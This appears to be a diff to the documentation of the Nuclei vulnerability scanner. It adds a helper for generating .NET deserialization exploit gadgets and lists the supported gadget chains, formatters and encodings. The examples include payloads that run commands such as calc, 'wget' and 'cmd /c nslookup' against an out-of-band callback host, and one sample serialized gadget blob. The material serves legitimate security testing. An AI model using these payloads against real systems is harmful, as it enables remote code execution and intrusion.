@@ -24,6 +24,7 @@ Here is the list of all supported helper functions can be used in the RAW reques
 | ends_with(str string, suffix ...string) bool                          | Checks if the string ends with any of the provided substrings                                                                                                                                                                         | `ends_with("Hello", "lo")`                                                                                                                               | `true`                                                                                                                                                                                                                                                                                                                                                                                     |
 | equals_any(s interface{}, subs ...interface{}) bool                   | Verifies if an input equals any of the given items                                                                                                                                                                                    | `equals_any(status_code, 200, 201)`                                                                                                                       | `true`                                                                                                                                                                                                                                                                                                                                                                                    |
 | generate_java_gadget(gadget, cmd, encoding interface{}) string        | Generates a Java Deserialization Gadget                                                                                                                                                                                               | `generate_java_gadget("dns", "{{interactsh-url}}", "base64")`                                                                                            | `rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAAHQAAHEAfgAFdAAFcHh0ACpjYWhnMmZiaW41NjRvMGJ0MHRzMDhycDdlZXBwYjkxNDUub2FzdC5mdW54` |
+| generate_dotnet_gadget(gadget, cmd, formatter, encoding string) string | Generates a .NET Deserialization Gadget with specified formatter and encoding                                                                                                                                                         | `generate_dotnet_gadget("type-confuse-delegate", "calc", "binary", "base64-raw")`                                                                         | `AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGA...`                                                                                                                                                                                                                                                                    |
 | generate_jwt(json, algorithm, signature, unixMaxAge) []byte           | Generates a JSON Web Token (JWT) using the claims provided in a JSON string, the signature, and the specified algorithm                                                                                                               | `generate_jwt("{\"name\":\"John Doe\",\"foo\":\"bar\"}", "HS256", "hello-world")`                                                                        | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmb28iOiJiYXIiLCJuYW1lIjoiSm9obiBEb2UifQ.EsrL8lIcYJR_Ns-JuhF3VCllCP7xwbpMCCfHin_WT6U`                                                                                                                                                                                                                                                              |
 | gzip(input string) string                                             | Compresses the input using GZip                                                                                                                                                                                                       | `base64(gzip("Hello"))`                                                                                                                                  | `+H4sIAAAAAAAA//JIzcnJBwQAAP//gonR9wUAAAA=`                                                                                                                                                                                                                                                                                                                                                |
 | gzip_decode(input string) string                                      | Decompresses the input using GZip                                                                                                                                                                                                     | `gzip_decode(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000"))`                                                                  | `Hello`                                                                                                                                                                                                                                                                                                                                                                                    |
@@ -110,6 +111,81 @@ Nuclei allows payload generation for a few common gadget from [ysoserial](https:
 
 ```yaml
 {{generate_java_gadget("commons-collections3.1", "wget http://{{interactsh-url}}", "base64")}}
+```
+
+### .NET Deserialization
+
+Nuclei provides the `generate_dotnet_gadget` function to generate .NET deserialization exploit payloads with various gadget chains, formatters, and encodings.
+
+**Function format:**
+
+```yaml
+{{generate_dotnet_gadget(gadget, cmd, formatter, encoding)}}
+```
+
+**Parameters:**
+
+- `gadget` - The gadget chain to use
+- `cmd` - Command, URL, or data (depends on gadget type)
+- `formatter` - Serialization formatter (optional, defaults to BinaryFormatter)
+- `encoding` - Output encoding format (optional, defaults to URL-safe base64)
+
+**Supported Gadgets:**
+
+Command-based gadgets (execute system commands):
+- `windows-identity` - WindowsIdentity gadget
+- `claims-principal` - ClaimsPrincipal gadget
+- `dataset` - DataSet gadget
+- `dataset-type-spoof` - DataSet with type spoofing
+- `object-data-provider` - ObjectDataProvider gadget
+- `text-formatting-runproperties` - TextFormattingRunProperties gadget
+- `type-confuse-delegate` - TypeConfuseDelegate gadget
+
+URL-based gadgets (make HTTP requests):
+- `object-ref` - Remote object reference
+- `veeam-crypto-keyinfo` - Veeam CryptoKeyInfo gadget
+
+XML-based gadgets:
+- `dataset-xmldiffgram` - DataSet XML DiffGram
+
+DLL-based gadgets:
+- `axhost-state-dll` - AxHostState DLL loading
+- `dll-reflection` - DLL reflection loading
+
+ViewState gadget:
+- `viewstate` - ASP.NET ViewState (format: `"payloadData:machineKey:generator"`)
+
+**Supported Formatters:**
+
+- `binary` or `binaryformatter` - BinaryFormatter (default)
+- `soap` or `soapformatter` - SOAPFormatter
+- `soapwithexceptions` or `soap-exceptions` - SOAPFormatter with exceptions
+- `los` or `losformatter` - LOSFormatter
+- Empty string - defaults to BinaryFormatter
+
+**Supported Encodings:**
+
+- `raw` - Raw binary string
+- `hex` - Hexadecimal encoding
+- `gzip` - Gzip compressed
+- `gzip-base64` - Gzip + URL-safe base64
+- `base64-raw` - Standard base64
+- Empty string - URL-safe base64 (default)
+
+**.NET Deserialization examples:**
+
+```yaml
+# Windows command execution with BinaryFormatter
+{{generate_dotnet_gadget("windows-identity", "calc", "binary", "base64-raw")}}
+
+# Remote payload fetch with SOAPFormatter
+{{generate_dotnet_gadget("object-ref", "http://{{interactsh-url}}", "soap", "hex")}}
+
+# TypeConfuseDelegate with custom command
+{{generate_dotnet_gadget("type-confuse-delegate", "cmd /c nslookup {{interactsh-url}}", "binary", "base64-raw")}}
+
+# ViewState gadget
+{{generate_dotnet_gadget("viewstate", "{{base64(payload)}}:machineKey:generator", "", "base64-raw")}}
 ```
 
 ## JSON helper functions
